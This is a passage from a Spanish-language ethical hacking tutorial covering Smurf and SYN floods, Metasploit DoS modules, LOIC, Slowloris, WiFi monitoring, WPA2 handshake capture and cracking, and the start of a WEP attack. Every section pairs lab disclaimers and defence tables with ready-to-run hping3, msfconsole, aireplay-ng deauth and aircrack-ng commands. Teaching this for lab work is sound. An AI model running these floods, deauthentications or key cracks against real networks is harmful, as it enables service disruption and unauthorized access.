| ---------------------------- | ------------------------------------------- |
| ğŸ”¥ Firewalls (iptables, ufw) | Bloquean conexiones sospechosas             |
| ğŸ§  IDS/IPS (Snort, Suricata) | Detectan patrones de ataque                 |
| â³ TCP timeouts bajos        | Evitan que SYN queden abiertos mucho tiempo |
| ğŸ›¡ï¸ Rate limiting             | Limita cantidad de peticiones por segundo   |
| ğŸ§© Servicios como Cloudflare | Filtran trÃ¡fico antes de llegar al servidor |

---

### âœ… Resumen

| Ataque     | Funciona conâ€¦    | Resultado                 |
| ---------- | ---------------- | ------------------------- |
| ICMP Flood | Ping (ICMP)      | Agota la red o la CPU     |
| SYN Flood  | TCP (puerto 80â€¦) | Satura las conexiones TCP |

---

[ğŸ”¼](#Ã­ndice)

---

## **826. Ataques Smurf y DoS con Metasploit**

### ğŸ§¨ Â¿QuÃ© es un ataque DoS?

**DoS (Denial of Service)** o DenegaciÃ³n de Servicio es un tipo de ataque cuyo objetivo es **interrumpir o saturar un servicio o sistema**, haciÃ©ndolo inaccesible para usuarios legÃ­timos.

---

### ğŸ’¥ Â¿QuÃ© es un Ataque Smurf?

#### ğŸ§  DefiniciÃ³n:

Un **ataque Smurf** es un ataque de tipo **ICMP Flood amplificado**, que aprovecha las caracterÃ­sticas de red para **multiplicar el trÃ¡fico de ping (ICMP Echo Request)** y **saturar a una vÃ­ctima**.

#### ğŸ“Œ Â¿CÃ³mo funciona?

1. El atacante **envÃ­a paquetes ICMP con direcciÃ³n IP falsificada (spoofed)** como si vinieran de la vÃ­ctima.
2. Estos paquetes se envÃ­an a la **direcciÃ³n de broadcast** de una red.
3. Todos los dispositivos en esa red **responden al ping**, pero la respuesta va a la vÃ­ctima.
4. El resultado: la vÃ­ctima **recibe cientos o miles de respuestas ICMP**, lo que **la satura**.

#### ğŸ§ª Requisitos para funcionar:

- Una red que responda a ICMP Broadcast (actualmente rara).
- DirecciÃ³n IP falsificada (IP Spoofing).
- Permisos para enviar paquetes "crudos" (root en Linux).

---

### ğŸ§° Â¿QuÃ© es Metasploit?

**Metasploit Framework** es una plataforma muy poderosa para **explotar vulnerabilidades, simular ataques y realizar pruebas de penetraciÃ³n**.

Incluye **mÃ³dulos de ataque DoS**, aunque muchos son especÃ­ficos para servicios y sistemas antiguos.

---

### ğŸ”§ InstalaciÃ³n de herramientas necesarias

#### ğŸ“¥ 1. Instalar Metasploit en Kali Linux (viene preinstalado):

```bash
msfconsole
```

Si no lo tienes, instÃ¡lalo con:

```bash
sudo apt update
sudo apt install metasploit-framework
```

---

#### ğŸ“¥ 2. Instalar hping3 (para simular ataque Smurf manual):

```bash
sudo apt install hping3
```

---

### ğŸ§ª ğŸ”¬ SimulaciÃ³n de Ataque Smurf (Manual)

Como muchas redes modernas **bloquean el broadcast ICMP**, esto solo se recomienda hacer **en un entorno controlado (red local virtual o laboratorio)**.

#### ğŸ¯ Supongamos:

- IP de la vÃ­ctima: `192.168.1.100`
- DirecciÃ³n broadcast: `192.168.1.255`

#### ğŸ› ï¸ Paso para lanzar el ataque:

```bash
sudo hping3 -1 -a 192.168.1.100 -c 1000 -d 120 -b 192.168.1.255
```

ğŸ“Œ ExplicaciÃ³n de los parÃ¡metros:

| ParÃ¡metro | Significado                         |
| --------- | ----------------------------------- |
| `-1`      | Protocolo ICMP                      |
| `-a`      | Spoofea (falsifica) la IP de origen |
| `-c 1000` | NÃºmero de paquetes a enviar         |
| `-d 120`  | TamaÃ±o del paquete                  |
| `-b`      | EnvÃ­a a la direcciÃ³n de broadcast   |

âœ… Esto hace que todos los dispositivos de la red respondan a la vÃ­ctima, **saturÃ¡ndola con respuestas** ICMP.

---

### âš”ï¸ Ataques DoS con Metasploit

#### ğŸ§  Â¿QuÃ© hace Metasploit aquÃ­?

Metasploit contiene **mÃ³dulos especÃ­ficos para ataques de tipo DoS**, como:

- Servicios web
- FTP, SMB, DNS
- Aplicaciones vulnerables

Muchos mÃ³dulos son de prueba o afectan servicios antiguos.

---

#### ğŸ¯ Ejemplo real: Ataque DoS con Metasploit a servicio FTP (vsftpd)

ğŸ§ª Requiere una mÃ¡quina vÃ­ctima con **vsftpd 2.3.4**, un servidor FTP vulnerable.

---

#### ğŸ‘£ Paso a paso con Metasploit

1. Iniciar Metasploit:

```bash
msfconsole
```

2. Buscar mÃ³dulos DoS disponibles:

```bash
search type:dos
```

3. Usar uno, por ejemplo:

```bash
use auxiliary/dos/unix/ftp/vsftpd_234_backdoor
```

4. Ver opciones:

```bash
show options
```

5. Establecer la IP del objetivo:

```bash
set RHOSTS 192.168.1.100
```

6. Ejecutar el ataque:

```bash
run
```

ğŸ¯ Esto provoca un DoS si el servicio es vulnerable.

---

### âœ… Ejemplo completo final: Ataque DoS con Metasploit

ğŸ§ª **Objetivo**: Realizar un ataque de denegaciÃ³n de servicio a un servidor FTP vulnerable (vsftpd 2.3.4)

#### ğŸ’» Requisitos:

- Kali Linux con Metasploit
- MÃ¡quina vÃ­ctima (Linux) con vsftpd 2.3.4 instalado

#### ğŸ‘£ Pasos en la prÃ¡ctica:

```bash
# En Kali:
msfconsole
```

```bash
# Buscar mÃ³dulo de ataque
search vsftpd

# Usar el mÃ³dulo
use auxiliary/dos/unix/ftp/vsftpd_234_backdoor

# Ver parÃ¡metros
show options

# Establecer IP del objetivo
set RHOSTS 192.168.1.100

# Ejecutar el ataque
run
```

ğŸ¯ Si el ataque tiene Ã©xito, el servicio FTP de la vÃ­ctima se cuelga.

---

### ğŸ›¡ï¸ Â¿CÃ³mo protegerse?

| ProtecciÃ³n                   | DescripciÃ³n                                     |
| ---------------------------- | ----------------------------------------------- |
| ğŸ”¥ Desactivar ICMP Broadcast | En el router o firewall                         |
| ğŸ§± Firewall                  | Limitar trÃ¡fico sospechoso por puertos o IP     |
| ğŸ›¡ï¸ IPS/IDS                   | Sistemas de detecciÃ³n (Snort, Suricata)         |
| ğŸš« Rate Limiting             | Evita saturaciÃ³n por muchas solicitudes         |
| ğŸ“¦ Actualizar servicios      | Parchear servicios antiguos (como vsftpd 2.3.4) |

---

### ğŸ“š RESUMEN

| Tema                      | ExplicaciÃ³n fÃ¡cil                                |
| ------------------------- | ------------------------------------------------ |
| Ataque Smurf              | InundaciÃ³n ICMP vÃ­a broadcast con IP falsificada |
| Ataque DoS con Metasploit | Usar mÃ³dulos para saturar servicios vulnerables  |
| Herramientas usadas       | `hping3`, `msfconsole`                           |
| RecomendaciÃ³n             | Solo en laboratorio, nunca en redes reales       |

---

[ğŸ”¼](#Ã­ndice)

---

## **827. Ataques con LOIC**

### ğŸ§  Â¿QuÃ© es LOIC?

LOIC, siglas de **Low Orbit Ion Cannon**, es una herramienta de cÃ³digo abierto diseÃ±ada originalmente para realizar **pruebas de estrÃ©s en redes y servidores**.

Sin embargo, tambiÃ©n ha sido usada para realizar **ataques DoS y DDoS** (DenegaciÃ³n de Servicio Distribuido).

---

### âš ï¸ Importante

> **LOIC no oculta tu IP.** Si haces un ataque real, tu direcciÃ³n puede ser rastreada fÃ¡cilmente. Esta herramienta **solo debe usarse con fines educativos o en laboratorios controlados**.

---

### ğŸ“Œ Â¿CÃ³mo funciona LOIC?

- EnvÃ­a una gran cantidad de peticiones al servidor objetivo (por ejemplo, HTTP, TCP o UDP).
- El servidor empieza a **saturarse** por exceso de trÃ¡fico.
- Si se realiza desde muchas computadoras (DDoS), el servidor puede **caer temporalmente**.

---

### ğŸ§° MÃ©todos de ataque que usa LOIC

| Tipo de ataque | Protocolo usado | Objetivo                          |
| -------------- | --------------- | --------------------------------- |
| TCP Flood      | TCP             | Abrir conexiones sin finalizar    |
| UDP Flood      | UDP             | Inundar con paquetes vacÃ­os       |
| HTTP Flood     | HTTP            | Peticiones masivas de pÃ¡ginas web |

---

### ğŸ’» InstalaciÃ³n de LOIC

Puedes usar **Windows**, **Linux (vÃ­a Mono)** o **ejecutar la versiÃ³n web (JS LOIC)**

#### ğŸ”¹ OpciÃ³n 1: En Windows

1. Ve al repositorio oficial o confiable:
   ğŸ‘‰ [https://github.com/NewEraCracker/LOIC](https://github.com/NewEraCracker/LOIC)

2. Descarga el archivo `.zip` o `.exe`.

3. Ejecuta `LOIC.exe` (no requiere instalaciÃ³n).

#### ğŸ”¹ OpciÃ³n 2: En Linux (Kali, Ubuntu)

1. Instala Mono:

```bash
sudo apt update
sudo apt install mono-complete
```

2. Descarga LOIC:

```bash
git clone https://github.com/NewEraCracker/LOIC.git
cd LOIC
```

3. Ejecuta LOIC:

```bash
mono LOIC.exe
```

---

### ğŸ§ª Ejemplo completo: Ataque con LOIC en laboratorio

#### âš™ï¸ Escenario de laboratorio

| MÃ¡quina       | Sistema        | Rol              |
| ------------- | -------------- | ---------------- |
| Kali Linux    | Linux          | Atacante         |
| Windows/Linux | Servidor local | VÃ­ctima (Apache) |

> âš ï¸ NO usar IPs reales ni servicios pÃºblicos. Solo en un entorno local.

---

#### ğŸ‘£ Paso 1: Preparar mÃ¡quina vÃ­ctima

En la vÃ­ctima, instala un servidor web Apache:

```bash
sudo apt update
sudo apt install apache2
```

Comprueba que funciona:

```bash
curl http://localhost
```

Anota su IP local, por ejemplo: `192.168.1.101`

---

#### ğŸ‘£ Paso 2: Ejecutar LOIC

Desde Kali o Windows:

1. Ejecuta `LOIC`.

2. En la ventana:

   | Campo         | Valor                                    |
   | ------------- | ---------------------------------------- |
   | **IP or URL** | `192.168.1.101`                          |
   | **Method**    | `HTTP` (puedes probar tambiÃ©n TCP o UDP) |
   | **Port**      | `80` (puerto web por defecto)            |
   | **# Threads** | `10-100` (segÃºn tu CPU)                  |

3. Marca la casilla: âœ… **IMMA CHARGIN MAH LAZER**

4. Presiona el botÃ³n: ğŸ”´ **FIRE!**

---

#### ğŸ‘€ Paso 3: Ver efectos en la vÃ­ctima

En la vÃ­ctima (servidor Apache):

Abre terminal y ejecuta:

```bash
htop
```

o

```bash
sudo netstat -antp | grep :80
```

VerÃ¡s:

- Alto consumo de CPU/RAM en `apache2`
- Muchas conexiones entrantes
- El navegador puede dejar de responder

---

### ğŸ›‘ Â¿CÃ³mo detener el ataque?

Presiona `STOP` o cierra la aplicaciÃ³n LOIC.

---

### ğŸ” Â¿CÃ³mo protegerse de LOIC?

| Defensa                      | DescripciÃ³n                                |
| ---------------------------- | ------------------------------------------ |
| ğŸ”¥ Firewall (iptables, ufw)  | Limita nÃºmero de conexiones por IP         |
| â±ï¸ Rate Limiting             | Configura lÃ­mite de peticiones por segundo |
| ğŸ§  IDS/IPS (Snort, Suricata) | Detectan patrones de DoS                   |
| â˜ï¸ Cloudflare / WAF          | Protegen servicios web en producciÃ³n       |

---

### ğŸ“š Resumen general

| Elemento        | Detalle                                      |
| --------------- | -------------------------------------------- |
| Herramienta     | LOIC (Low Orbit Ion Cannon)                  |
| Tipos de ataque | TCP Flood, UDP Flood, HTTP Flood             |
| InstalaciÃ³n     | Sencilla, en Windows o Linux (vÃ­a Mono)      |
| Ejemplo         | Ataque a Apache local en puerto 80           |
| Seguridad       | Solo usar en entornos educativos/laboratorio |

---

[ğŸ”¼](#Ã­ndice)

---

## **828. Pentesting con DoS**

### ğŸ§  Â¿QuÃ© es un ataque DoS?

**DoS (Denial of Service)** es un tipo de ataque que busca **interrumpir el funcionamiento normal de un servicio, red o sistema**, haciÃ©ndolo inaccesible para usuarios legÃ­timos.

> El **Pentesting con DoS** consiste en **simular estos ataques** en un entorno controlado para:
>
> - Verificar si un sistema puede resistirlos
> - Identificar vulnerabilidades
> - Implementar medidas de defensa

---

### ğŸ§± Tipos comunes de ataques DoS

| Tipo de ataque    | DescripciÃ³n                                                        |
| ----------------- | ------------------------------------------------------------------ |
| **TCP SYN Flood** | EnvÃ­a miles de peticiones de conexiÃ³n sin completar el "handshake" |
| **UDP Flood**     | Envia muchos paquetes UDP para saturar el puerto                   |
| **ICMP Flood**    | Inunda la red con paquetes `ping`                                  |
| **Slowloris**     | Mantiene abiertas conexiones HTTP incompletas                      |
| **HTTP Flood**    | Inunda un servidor web con muchas peticiones HTTP vÃ¡lidas          |

---

### ğŸ› ï¸ Herramientas mÃ¡s usadas para Pentesting con DoS

| Herramienta    | Tipo de ataque soportado           | Sistema       |
| -------------- | ---------------------------------- | ------------- |
| **hping3**     | TCP, UDP, ICMP Flood               | Linux         |
| **LOIC/HOIC**  | HTTP/TCP/UDP Flood                 | Windows/Linux |
| **Metasploit** | Exploits y mÃ³dulos DoS especÃ­ficos | Kali Linux    |
| **Slowloris**  | HTTP Slow DoS                      | Python        |
| **GoldenEye**  | HTTP DoS para pruebas web          | Python        |

---

### ğŸ”§ InstalaciÃ³n de herramientas (en Kali Linux)

#### ğŸ”¹ Instalar `hping3`

```bash
sudo apt update
sudo apt install hping3
```

#### ğŸ”¹ Instalar `slowloris`

```bash
git clone https://github.com/gkbrk/slowloris.git
cd slowloris
```

#### ğŸ”¹ Instalar Metasploit

En Kali viene preinstalado. Si no:

```bash
sudo apt install metasploit-framework
```

---

### âš™ï¸ Ejemplo prÃ¡ctico completo: Pentesting DoS a servidor Apache

#### ğŸ¯ Objetivo:

Saturar un servidor Apache en un entorno de laboratorio usando `hping3`.

---

#### ğŸ–¥ï¸ Escenario del laboratorio

- **Atacante (Kali Linux)** â€” IP: `192.168.1.10`
- **VÃ­ctima (Ubuntu + Apache)** â€” IP: `192.168.1.20`

---

#### ğŸ‘£ Paso 1: Preparar la vÃ­ctima

1. En la mÃ¡quina vÃ­ctima, instala Apache:

```bash
sudo apt update
sudo apt install apache2
```

2. Verifica que funciona:

```bash
curl http://localhost
```

3. Anota la IP con:

```bash
ip a
```

---

#### ğŸ‘£ Paso 2: Ataque con `hping3` (SYN Flood)

En Kali Linux:

```bash
sudo hping3 -S -p 80 --flood 192.168.1.20
```

| ParÃ¡metro | Significado                |
| --------- | -------------------------- |
| `-S`      | Bandera SYN (peticiÃ³n TCP) |
| `-p 80`   | Puerto HTTP                |
| `--flood` | Enviar paquetes sin pausa  |

Este comando envÃ­a miles de peticiones SYN para **saturar el puerto 80** del servidor Apache.

---

#### ğŸ‘€ Paso 3: Ver comportamiento en la vÃ­ctima

En Ubuntu vÃ­ctima:

```bash
sudo netstat -antp | grep :80
```

DeberÃ­as ver muchas conexiones en estado `SYN_RECV` que no se completan (handshake incompleto).

---

### ğŸ§ª Ejemplo alternativo: Ataque con **Slowloris**

1. En Kali:

```bash
git clone https://github.com/gkbrk/slowloris.git
cd slowloris
python3 slowloris.py 192.168.1.20
```

Este script mantiene **muchas conexiones abiertas** al servidor Apache sin cerrarlas, agotando sus recursos.

---

### ğŸ” Â¿CÃ³mo protegerse de ataques DoS?

| Defensa                    | ExplicaciÃ³n                                                |
| -------------------------- | ---------------------------------------------------------- |
| ğŸ”¥ Firewall (UFW/iptables) | Bloquear IPs con demasiadas conexiones                     |
| ğŸ›¡ï¸ Fail2Ban                | Detecta patrones y bloquea IPs automÃ¡ticamente             |
| ğŸšª Limitar conexiones      | Configurar Apache o NGINX para limitar conexiones/sesiones |
| â˜ï¸ WAF / Cloudflare        | ProtecciÃ³n a nivel de red o aplicaciÃ³n                     |

---

### ğŸ§ª Checklist de Pentesting con DoS

âœ… Establecer entorno controlado (mÃ¡quinas virtuales)

âœ… Escanear puertos con `nmap`

âœ… Seleccionar tÃ©cnica de DoS (TCP Flood, HTTP Flood, Slowloris, etc.)

âœ… Ejecutar ataque

âœ… Observar comportamiento (logs, conexiones, rendimiento)

âœ… Documentar resultados

âœ… Aplicar contramedidas

---

### ğŸ“ Resumen final

| Elemento            | DescripciÃ³n fÃ¡cil                               |
| ------------------- | ----------------------------------------------- |
| QuÃ© es              | Ataque para interrumpir servicios               |
| Herramientas usadas | `hping3`, `Slowloris`, `Metasploit`, `LOIC`     |
| Requiere            | Laboratorio controlado (Kali + servidor Apache) |
| Objetivo del test   | Saber si el sistema puede resistir sobrecarga   |
| Defensa             | Firewall, IDS/IPS, lÃ­mites por IP, WAF          |

---

[ğŸ”¼](#Ã­ndice)

---

## **829. ConfiguraciÃ³n de entorno para auditorÃ­a WiFi**

### ğŸ§  Â¿QuÃ© es una auditorÃ­a WiFi?

Una **auditorÃ­a WiFi** es el proceso de **analizar, evaluar y probar la seguridad de una red inalÃ¡mbrica (WiFi)** para identificar posibles vulnerabilidades.

---

### ğŸ¯ Objetivo de una auditorÃ­a WiFi

- Identificar redes vulnerables (sin cifrado, WEP, WPA mal configurado).
- Capturar paquetes y analizar trÃ¡fico.
- Intentar romper claves WiFi (ethical hacking).
- Probar ataques como **evil twin**, **deauth**, **handshake capture**, etc.

---

### âš™ï¸ Â¿QuÃ© necesito para hacer una auditorÃ­a WiFi?

#### ğŸ–¥ï¸ Requisitos del sistema

| Recurso                   | Recomendado                                                           |
| ------------------------- | --------------------------------------------------------------------- |
| Sistema operativo         | Kali Linux (ideal para pentesting)                                    |
| Adaptador WiFi USB        | Compatible con modo monitor y packet injection (como Alfa AWUS036ACH) |
| Espacio de almacenamiento | 20 GB mÃ­nimo                                                          |
| RAM                       | 2 GB mÃ­nimo, 4 GB recomendable                                        |

---

### ğŸ§° Herramientas necesarias

| Herramienta   | DescripciÃ³n                        |
| ------------- | ---------------------------------- |
| `aircrack-ng` | Suite para auditorÃ­a de redes WiFi |
| `reaver`      | Ataques a WPS                      |
| `wash`        | DetecciÃ³n de redes WPS             |
| `Wireshark`   | AnÃ¡lisis de paquetes               |
| `bettercap`   | Ataques MITM en WiFi               |
| `wifite`      | AutomatizaciÃ³n de auditorÃ­as WiFi  |

> Todas estas herramientas vienen **preinstaladas** en **Kali Linux**.

---

### ğŸ§ª PASO A PASO: ConfiguraciÃ³n del entorno

---

#### ğŸ”¹ 1. Instalar Kali Linux

- Puedes instalarlo en:

  - MÃ¡quina virtual (VirtualBox, VMware)
  - Live USB
  - InstalaciÃ³n nativa

ğŸ“¥ Descarga desde:
[https://www.kali.org/get-kali/](https://www.kali.org/get-kali/)

> **Recomendado**: Si usarÃ¡s auditorÃ­a WiFi real, hazlo desde un Live USB o instalaciÃ³n real, no desde una VM (por temas de compatibilidad del adaptador WiFi USB).

---

#### ğŸ”¹ 2. Conecta un adaptador WiFi externo (compatible)

Ejemplo de adaptadores recomendados:

- Alfa AWUS036NHA
- Alfa AWUS036ACH
- TP-Link TL-WN722N v1 (Â¡solo la versiÃ³n 1!)

Verifica que estÃ© detectado:

```bash
iwconfig
```

---

#### ğŸ”¹ 3. Poner adaptador en modo monitor

```bash
sudo airmon-ng start wlan0
```

Esto activarÃ¡ el modo monitor y renombrarÃ¡ el adaptador a algo como `wlan0mon`.

---

#### ğŸ”¹ 4. Ver redes disponibles

```bash
sudo airodump-ng wlan0mon
```

VerÃ¡s todas las redes WiFi cercanas con informaciÃ³n como:

- BSSID (MAC del router)
- Canal (CH)
- Seguridad (WEP/WPA/WPA2)
- Potencia de seÃ±al (PWR)

---

### âœ… EJEMPLO COMPLETO: Captura de handshake WPA2

Este es un paso esencial en auditorÃ­as WiFi para romper contraseÃ±as WPA/WPA2.

---

#### ğŸ¯ Objetivo

Capturar el **handshake** de una red WPA2 al forzar la reconexiÃ³n de un cliente.

---

#### ğŸ‘£ PASO A PASO

##### 1. Iniciar monitoreo

```bash
sudo airmon-ng start wlan0
```

> QuedarÃ¡ como `wlan0mon`

---

##### 2. Escanear redes

```bash
sudo airodump-ng wlan0mon
```

> Identifica una red WPA2 con clientes conectados. Anota:
>
> - BSSID
> - Canal (CH)
> - Nombre de red (ESSID)

---

##### 3. Enfocarse en una sola red

```bash
sudo airodump-ng -c [CANAL] --bssid [BSSID] -w captura wlan0mon
```

Reemplaza:

- `[CANAL]`: Canal del router (ej: 6)
- `[BSSID]`: MAC del router
- `captura`: nombre del archivo de salida

> Ejemplo:

```bash
sudo airodump-ng -c 6 --bssid 84:16:F9:44:9D:60 -w captura wlan0mon
```

---

##### 4. Forzar la desconexiÃ³n de un cliente

Abre otra terminal:

```bash
sudo aireplay-ng --deauth 5 -a [BSSID] wlan0mon
```

Esto envÃ­a 5 paquetes de deautenticaciÃ³n al router, forzando la reconexiÃ³n del cliente. Durante la reconexiÃ³n, se captura el **handshake**.

---

##### 5. Verifica captura

```bash
ls captura-01.cap
```

Puedes abrir el archivo `.cap` en Wireshark o intentar crackearlo con `aircrack-ng`.

---

##### 6. Crackeo de la clave (opcional)

Si tienes un diccionario de contraseÃ±as (`rockyou.txt`):

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b [BSSID] captura-01.cap
```

---

### ğŸ§° Herramienta alternativa: Wifite (automatiza todo)

```bash
sudo wifite
```

- Detecta redes
- Captura handshake
- Intenta romper la contraseÃ±a automÃ¡ticamente

Â¡Muy Ãºtil para principiantes!

---

### ğŸ›¡ï¸ Advertencia Ã©tica

> Solo puedes hacer esto en:
>
> - Redes propias
> - Laboratorios autorizados
> - Con permiso explÃ­cito

Nunca audites redes ajenas sin autorizaciÃ³n. Esto puede ser **ilegal**.

---

### ğŸ› ï¸ CÃ³mo crear un laboratorio WiFi seguro

1. Usa un router viejo o AP virtual
2. Crea una red WiFi WPA2
3. Conecta una mÃ¡quina virtual a esa red
4. Usa Kali desde otra mÃ¡quina con adaptador WiFi

---

### ğŸ“š Resumen general

| Elemento            | DescripciÃ³n                                 |
| ------------------- | ------------------------------------------- |
| SO Recomendado      | Kali Linux                                  |
| Requisito clave     | Adaptador WiFi con modo monitor             |
| Herramientas usadas | `aircrack-ng`, `airodump-ng`, `aireplay-ng` |
| Objetivo            | Capturar handshake, evaluar seguridad       |
| RecomendaciÃ³n Ã©tica | Solo en redes propias o con autorizaciÃ³n    |

---

[ğŸ”¼](#Ã­ndice)

---

## **830. Monitoreo de redes WiFi**

### ğŸ§  Â¿QuÃ© es el monitoreo de redes WiFi?

El **monitoreo de redes WiFi** consiste en **observar y analizar el trÃ¡fico inalÃ¡mbrico** que circula por una red WiFi. Esto incluye:

- Ver dispositivos conectados
- Capturar paquetes de datos (sniffing)
- Identificar redes cercanas
- Detectar intrusos o ataques

---

### ğŸ¯ Â¿Para quÃ© sirve?

| PropÃ³sito                  | Ejemplo fÃ¡cil                                       |
| -------------------------- | --------------------------------------------------- |
| Seguridad                  | Detectar si alguien se conectÃ³ a tu red sin permiso |
| DiagnÃ³stico de red         | Ver cuÃ¡ntos dispositivos usan tu red                |
| Pentesting / hacking Ã©tico | Capturar handshakes, detectar debilidades           |
| AnÃ¡lisis de rendimiento    | Evaluar calidad de la seÃ±al, saturaciÃ³n de canales  |

---

### ğŸ§° Herramientas para monitoreo WiFi

| Herramienta      | Uso principal                            | Sistema        |
| ---------------- | ---------------------------------------- | -------------- |
| **Wireshark**    | Captura y anÃ¡lisis de paquetes           | Linux, Windows |
| **airodump-ng**  | Escaneo y captura de redes WiFi          | Linux (Kali)   |
| **Kismet**       | DetecciÃ³n pasiva de redes y dispositivos | Linux          |
| **tcpdump**      | Captura de trÃ¡fico en CLI                | Linux          |
| **Acrylic WiFi** | EscÃ¡ner visual (solo Windows)            | Windows        |

---

### ğŸ–¥ï¸ Requisitos del sistema

- **Sistema operativo**: Linux (Kali recomendado) o Windows (con limitaciones)
- **Adaptador WiFi externo**: que soporte **modo monitor y packet injection**

#### Recomendados:

- Alfa AWUS036ACH
- TP-Link TL-WN722N v1 (solo versiÃ³n 1)

---

### ğŸ”§ InstalaciÃ³n de herramientas (en Kali Linux)

#### ğŸ 1. `aircrack-ng` (incluye `airodump-ng`, `aireplay-ng`, etc.)

Ya viene instalado en Kali, pero puedes instalarlo manualmente:

```bash
sudo apt update
sudo apt install aircrack-ng
```

---

#### ğŸ¬ 2. `Wireshark`

```bash
sudo apt install wireshark
```

Para permitir captura sin root:

```bash
sudo dpkg-reconfigure wireshark-common
sudo usermod -aG wireshark $USER
```

---

#### ğŸ›°ï¸ 3. `Kismet`

```bash
sudo apt install kismet
```

---

### ğŸ§ª EJEMPLO COMPLETO: Monitorear trÃ¡fico WiFi con `airodump-ng`

---

#### ğŸ”¹ OBJETIVO:

Ver todas las redes WiFi disponibles, dispositivos conectados y capturar paquetes para analizarlos luego.

---

#### ğŸ”¸ Escenario:

- Kali Linux con adaptador WiFi
- Red WiFi objetivo en el entorno (ej. casa/laboratorio)
- PropÃ³sito: monitoreo pasivo (sin intervenir)

---

#### ğŸ‘£ PASO A PASO:

---

##### 1. Verifica que el adaptador estÃ¡ conectado

```bash
iwconfig
```

Debe mostrar una interfaz como `wlan0`

---

##### 2. Pon el adaptador en modo monitor

```bash
sudo airmon-ng start wlan0
```

Esto crea `wlan0mon`

---

##### 3. Escanea todas las redes disponibles

```bash
sudo airodump-ng wlan0mon
```

Se mostrarÃ¡n:

- Nombre de las redes (ESSID)
- Canal (CH)
- Seguridad (WEP/WPA/WPA2)
- BSSID (MAC del router)
- Dispositivos conectados (en parte inferior)

---

##### 4. Monitorea una red especÃ­fica

SupÃ³n que el canal es 6 y BSSID es `00:11:22:33:44:55`:

```bash
sudo airodump-ng --bssid 00:11:22:33:44:55 -c 6 -w captura wlan0mon
```

Esto:

- Focaliza en una sola red
- Guarda la captura en un archivo `.cap` llamado `captura.cap`

---

##### 5. Analiza los paquetes con Wireshark

Abre Wireshark:

```bash
wireshark
```

Y abre el archivo:

```bash
File > Open > captura-01.cap
```

VerÃ¡s cada paquete de red con detalles como:

- DirecciÃ³n MAC de origen/destino
- Tipo de trÃ¡fico (ARP, DNS, HTTP)
- Posibles handshakes si los hubo

---

### ğŸ•µï¸â€â™‚ï¸ Â¿QuÃ© puedes observar?

- Â¿QuiÃ©n estÃ¡ conectado a una red?
- Â¿Se estÃ¡n enviando paquetes ARP sospechosos?
- Â¿Hay dispositivos enviando muchos paquetes de broadcast?
- Â¿Hay handshakes WPA2? (para pruebas Ã©ticas)

---

### ğŸ§  Tipos de trÃ¡fico que se pueden ver

| Protocolo | QuÃ© muestra                                     |
| --------- | ----------------------------------------------- |
| ARP       | Mapeo IP-MAC, Ãºtil para detectar ataques        |
| DHCP      | AsignaciÃ³n de IPs, detectar nuevos dispositivos |
| DNS       | Sitios que visitan los usuarios                 |
| ICMP      | Pings y mensajes de red                         |
| HTTP      | Sitios y datos (si no estÃ¡ cifrado)             |

---

### ğŸ›¡ï¸ Consejos de seguridad

- **Siempre monitorea redes propias o con permiso**
- **Evita interferir**: solo observa, no ataques si no es un entorno controlado
- **Documenta lo que encuentres**, sobre todo si es para pentesting autorizado

---

### ğŸ§° Extra: Herramienta visual â€” Kismet

```bash
sudo kismet
```

- Interfaz web (puerto 2501)
- Muestra redes, dispositivos, ubicaciÃ³n aproximada, etc.

---

### ğŸ“˜ Resumen final

| Elemento            | Detalle                                                                 |
| ------------------- | ----------------------------------------------------------------------- |
| Â¿QuÃ© es?            | Observar el trÃ¡fico y dispositivos en una red WiFi                      |
| Herramientas usadas | `airodump-ng`, `Wireshark`, `Kismet`, `tcpdump`                         |
| Requisitos          | Kali Linux + Adaptador WiFi con modo monitor                            |
| Resultado           | Saber quiÃ©n se conecta, quÃ© tipo de trÃ¡fico circula, posibles anomalÃ­as |
| RecomendaciÃ³n       | No hacer ataques sin permiso, usar laboratorios controlados             |

---

[ğŸ”¼](#Ã­ndice)

---

## **831. Ataque a WEP**

### ğŸ§  Â¿QuÃ© es WEP?

**WEP (Wired Equivalent Privacy)** fue uno de los primeros protocolos de seguridad para redes WiFi. Su objetivo era ofrecer un nivel de seguridad comparable al de una red cableada.

ğŸ”’ Usa una clave precompartida (como una contraseÃ±a) y un algoritmo de cifrado RC4.

---

### âŒ Â¿Por quÃ© es inseguro?

WEP es vulnerable porque:

- Usa claves de cifrado muy **predecibles**
- El vector de inicializaciÃ³n (IV) es **demasiado corto (24 bits)** y se repite fÃ¡cilmente
- Las herramientas actuales pueden **capturar suficientes paquetes** y **romper la clave** en minutos

---

### ğŸ› ï¸ Herramientas necesarias

NecesitarÃ¡s un entorno como:

- ğŸ’» **Kali Linux**
- ğŸ“¡ Un **adaptador WiFi USB** compatible con **modo monitor e inyecciÃ³n de paquetes**

  - Ejemplo: **Alfa AWUS036NHA**

Y las siguientes herramientas (incluidas en Kali):

| Herramienta   | Para quÃ© sirve          |
| ------------- | ----------------------- |
| `airmon-ng`   | Activar modo monitor    |
| `airodump-ng` | Capturar paquetes       |
| `aireplay-ng` | Forzar trÃ¡fico a la red |
| `aircrack-ng` | Romper la clave WEP     |

---

### ğŸ”§ InstalaciÃ³n de herramientas (si no usas Kali)

En Debian/Ubuntu:

```bash
sudo apt update
sudo apt install aircrack-ng
```

---

### ğŸ§ª Ejemplo completo: Ataque a una red WEP

---

#### ğŸ¯ Objetivo:

Capturar suficiente trÃ¡fico en una red WiFi protegida con WEP y **obtener la clave**.

---

#### âš ï¸ IMPORTANTE:

> Solo debes hacerlo en una **red de pruebas o laboratorio**. Nunca ataques redes sin permiso.

---

#### ğŸŒ Escenario del laboratorio

- Red WEP: `Laboratorio-WEP`
- BSSID: `AA:BB:CC:DD:EE:FF`
- Canal: `6`
- Kali Linux como atacante
- Adaptador WiFi externo

---

### ğŸ‘£ PASO A PASO:

---

#### 1. Verifica tu interfaz WiFi

```bash
iwconfig
```

Debe mostrar algo como `wlan0`

---

#### 2. Pon la tarjeta en modo monitor

```bash
sudo airmon-ng start wlan0
```

Esto crearÃ¡ `wlan0mon`

---

#### 3. Escanea las redes WiFi

```bash
sudo airodump-ng wlan0mon
```

Busca una red que estÃ© cifrada con WEP.

Ejemplo de resultado:

```
BSSID              PWR  Beacons  #Data  CH  MB   ENC  ESSID
AA:BB:CC:DD:EE:FF  -40     122     15    6   54e  WEP  Laboratorio-WEP
```

---

#### 4. Captura paquetes de la red WEP

```bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_lab wlan0mon
```

Esto:

- Escucha solo en el canal 6
